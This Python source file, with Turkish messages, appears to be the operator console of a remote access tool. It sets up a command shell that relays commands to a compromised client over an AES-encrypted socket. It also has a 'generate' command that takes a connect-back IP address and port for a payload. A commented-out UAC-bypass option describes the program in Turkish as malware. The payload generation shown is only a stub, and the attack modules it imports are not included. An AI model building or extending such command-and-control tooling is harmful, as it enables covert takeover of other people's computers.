#!/usr/bin/env python3

# -*- encoding: utf-8 -*-

import subprocess
import contextlib

from core.utils.printing import *
from core.utils.client import Client
from core.cmd import Cmd
from core.utils.commons.networking import ip_validator
from core.utils.commons.networking import port_validator

from core.utils.parser import parse_list
from core.utils.parser import LineParser
from core.utils.parser import DataStore

class ClientCmd(Cmd):
    def __init__(self,hostname = None,peer_ip_addr = None,client_sock = None,aes_key = None,aes_iv = None):
        Cmd.__init__(self)
        self.hostname = hostname
        self.peer_ip_addr = peer_ip_addr
        self.client_sock = client_sock
        self.aes_key = aes_key
        self.aes_iv = aes_iv
        self.client_handler = Client(
            client_sock=self.client_sock,
            client_aes_key=self.aes_key,
            client_aes_iv=self.aes_iv
        )
    def default(self, line: str):
        command_header = parse_list(line.split(),index=0)
        data = " ".join(line.split(" ")[1:])
        if hasattr(self.client_handler,command_header):
            try:
                getattr(self.client_handler,command_header)(data)
            except Exception as fault:
                print_failure("%s komutu çalıştırırken %s hatası oluştu" % (command_header,fault))
        else:
            print_failure("Hatalı komut %s" % (line))
        
    def do_exit(self,*args):
        self.stop_cmd()
    def do_generate(self,line: str):
        line_parser = LineParser(line=line,funcname=self.do_generate)
        line_parser.new_argument("-i",
                                 name="ip_addr",
                                 is_required=True,
                                 help="Karşı tarafın bağlanacağı ip adresi"
                                 )
        line_parser.new_argument("-p",
                                 name="port_num",
                                 is_required=True,
                                 typing="int",
                                 help="Karşı tarafın bağlanacağı port numarası"
                                 )
        #line_parser.new_argument("-r",name="uac_bypass",store=True,help="Zararlı yazılımı UAC yetkileri ile çalıştırmak için")
        p = line_parser.parse_args()
        if not p is None:
            if not port_validator(p.port_num):
                print_failure("Geçersiz port numarası: %s" % (p.port_num))
            elif not ip_validator(p.ip_addr):
                print_failure("Geçersiz ip adresi: %s" % (p.ip_addr))
            else:
                print_succes(p.ip_addr,p.port_num)

def CliCmd(sock = None,host = None,port = None,aes_key = None,aes_iv = None,hostname = None):
    c = ClientCmd(
        hostname=hostname,
        peer_ip_addr=host,
        client_sock=sock,
        aes_key=aes_key,
        aes_iv=aes_iv
    )
    return c
if __name__ == "__main__":
    pass
